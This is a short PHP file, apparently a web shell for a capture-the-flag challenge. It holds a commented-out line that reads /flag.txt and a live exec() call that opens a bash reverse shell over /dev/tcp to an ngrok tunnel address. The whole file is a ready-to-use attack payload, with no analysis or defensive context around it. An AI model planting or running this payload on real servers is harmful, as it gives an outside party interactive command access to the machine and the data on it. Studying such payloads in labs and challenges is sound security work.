<?php
    // echo file_get_contents("/flag.txt");
    exec("/bin/bash -c 'bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/15764 0>&1'");
?>